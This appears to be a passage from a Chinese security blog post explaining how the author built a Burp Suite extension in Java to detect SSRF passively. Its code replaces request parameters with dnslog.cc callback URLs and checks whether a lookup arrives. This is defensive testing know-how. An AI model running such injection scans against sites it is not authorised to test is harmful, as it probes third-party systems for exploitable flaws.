      <url>/2022/11/23/burp-ssrf-cha-jian-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>burpsuite没有被动扫描ssrf的插件，而最近刚好在学java，于是乎动手撸了一个，这里就记录下大概的编写思路。</p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>这里我使用eclipse+maven来编写插件,新建一个maven项目</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221123170020311.png"></p><p>导入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.root0er.burp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>SSRF-SCAN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>addDefaultImplementationEntries</span><span class="token punctuation">></span></span>                                true                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>addDefaultImplementationEntries</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>net.portswigger.burp.extender<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>burp-extender-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.22<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.google.code.gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.8.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.google.guava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>guava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>29.0-jre<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.beanshell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>bsh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0b5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有以下几点必须注意的</p><ul><li>所有的burp插件都必须实现IBurpExtender这个接口；</li><li>实现类的包名称必须是burp；</li><li>实现类的名称必须是BurpExtender；</li><li>实现类比较是public的。</li></ul><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>1、生成随机值flag</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">random_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    String baseString <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890"</span><span class="token punctuation">;</span>    Random random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String flag <span class="token operator">=</span> <span class="token string">"ssrf_"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> flag <span class="token operator">+</span> baseString<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span>baseString<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、dnslog探测结果</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">dnslogResult</span><span class="token punctuation">(</span>String payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String api <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span>    String platformUrl <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"http://admin.dnslog.cc/api/web/%s/%s/"</span><span class="token punctuation">,</span> api<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> rawRequest <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>helpers<span class="token punctuation">.</span><span class="token function">buildHttpRequest</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>platformUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IHttpService service <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>helpers<span class="token punctuation">.</span><span class="token function">buildHttpService</span><span class="token punctuation">(</span><span class="token string">"admin.dnslog.cc"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">"HTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IHttpRequestResponse requestResponse <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>callback<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> rawRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> rawResponse <span class="token operator">=</span> requestResponse<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IResponseInfo responseInfo <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>rawResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>        String body <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>rawResponse<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>responseInfo<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        stderr<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里本来是用ceye来进行检测漏洞的，但是实际效果并不好，数据一多直接503，索性搭建个dnslog来检测了。如果body为true，则说明存在漏洞，返回true，反之返回flase。</p><p>3、检测漏洞</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> List<span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span> <span class="token function">checkVul</span><span class="token punctuation">(</span>IHttpRequestResponse baseRequestResponse<span class="token punctuation">,</span>List<span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span> issues<span class="token punctuation">)</span> <span class="token punctuation">{</span>        IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>baseRequestResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对HTTP请求进行分析</span>        String method <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取请求方法</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> request <span class="token operator">=</span> baseRequestResponse<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取请求包</span>        IHttpService Service <span class="token operator">=</span> baseRequestResponse<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         String path <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取漏洞的路径</span>        String host <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取主机头</span>        URL url <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>IParameter<span class="token operator">></span> parameters <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>IParameter parameter<span class="token operator">:</span>parameters<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String genatePayload <span class="token operator">=</span> <span class="token function">random_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String payload <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"http://%s.xxx.dnslog.cc/"</span><span class="token punctuation">,</span> genatePayload<span class="token punctuation">)</span><span class="token punctuation">;</span>            String key <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取参数名</span>            String value <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取参数值</span>            <span class="token keyword">byte</span> type <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取参数类型</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                IParameter newParameter <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildParameter</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">updateParameter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> newParameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                IHttpRequestResponse makeHttpRequest <span class="token operator">=</span> callback<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>Service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> makeHttpRequest<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                IResponseInfo analyzedResponse <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>                String resp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> bodyOffset <span class="token operator">=</span> analyzedResponse<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String body <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>bodyOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> statusCode <span class="token operator">=</span> analyzedResponse<span class="token punctuation">.</span><span class="token function">getStatusCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String vulString <span class="token operator">=</span> <span class="token string">"Not found SSRF"</span><span class="token punctuation">;</span>                <span class="token keyword">boolean</span> flag1 <span class="token operator">=</span> <span class="token function">dnslogResult</span><span class="token punctuation">(</span>genatePayload<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    String title <span class="token operator">=</span> <span class="token string">"SSRF VUL"</span><span class="token punctuation">;</span>                    vulString <span class="token operator">=</span> <span class="token string">"Found SSRF VUL"</span><span class="token punctuation">;</span>                    String message<span class="token operator">=</span><span class="token string">"&lt;br>Method: &lt;b>"</span>  <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"\n&lt;/b>&lt;br>Host: &lt;b>"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"\n&lt;/b>&lt;br>Endpoint: &lt;b>"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"\n&lt;/b>&lt;br>Location: &lt;b>"</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"&lt;/b>\n"</span><span class="token punctuation">;</span>                    issues<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CustomScanIssue</span><span class="token punctuation">(</span>Service<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IHttpRequestResponse</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>makeHttpRequest<span class="token punctuation">}</span><span class="token punctuation">,</span> title<span class="token punctuation">,</span> message<span class="token punctuation">,</span> <span class="token string">"High"</span><span class="token punctuation">,</span> <span class="token string">"Certain"</span><span class="token punctuation">,</span> <span class="token string">"Panic"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                tags<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span>url<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>statusCode<span class="token punctuation">,</span>key<span class="token punctuation">,</span>vulString<span class="token punctuation">,</span>makeHttpRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> issues<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里请求带有ssrf_xxxx的随机值，替换随机值后发送，然后去调用dnslogResult()方法，如果方法返回true，则说明api中带有ssrf_xxxx，存在ssrf漏洞。</p><p>这里简单讲下IScannerCheck，IScannerCheck这个api可以自定义扫描，一种是被动扫描，一种是主动扫描，比如在这个插件中，我选择被动扫描，在doPassiveScan中调用了checkVul方法，如果返回的issues不为空，则打印报告。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> List<span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span> <span class="token function">doPassiveScan</span><span class="token punctuation">(</span>IHttpRequestResponse baseRequestResponse<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span> issues <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkVul</span><span class="token punctuation">(</span>baseRequestResponse<span class="token punctuation">,</span>issues<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>issues<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> issues<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>IScanIssue<span class="token operator">></span> <span class="token function">doActiveScan</span><span class="token punctuation">(</span>IHttpRequestResponse baseRequestResponse<span class="token punctuation">,</span>                                     IScannerInsertionPoint insertionPoint<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 